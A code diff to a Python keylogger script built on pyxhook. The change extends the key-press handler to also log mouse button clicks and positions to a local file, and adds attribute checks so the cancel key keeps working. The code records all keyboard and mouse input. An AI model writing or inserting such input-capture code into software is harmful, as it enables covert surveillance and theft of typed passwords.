@@ -36,16 +36,23 @@ def main():
 
     cancel_key = args.cancel_key[0] if args.cancel_key else  '`'
 
+
     def OnKeyPress(event):
         with open(log_file, 'a') as f:
-            f.write('{}\n'.format(event.Key))
+            if hasattr(event, 'Key'):
+                f.write('{}\n'.format(event.Key))
+            else:
+                f.write('{} {}\n'.format(event.MessageName, event.Position))
 
-        if event.Ascii == cancel_key:
+        if hasattr(event, 'Ascii') and event.Ascii == cancel_key:
             new_hook.cancel()
 
     new_hook = pyxhook.HookManager()
     new_hook.KeyDown = OnKeyPress
     new_hook.HookKeyboard()
+
+    new_hook.MouseAllButtonsDown = OnKeyPress
+    new_hook.HookMouse()
 
     try:
         new_hook.start()
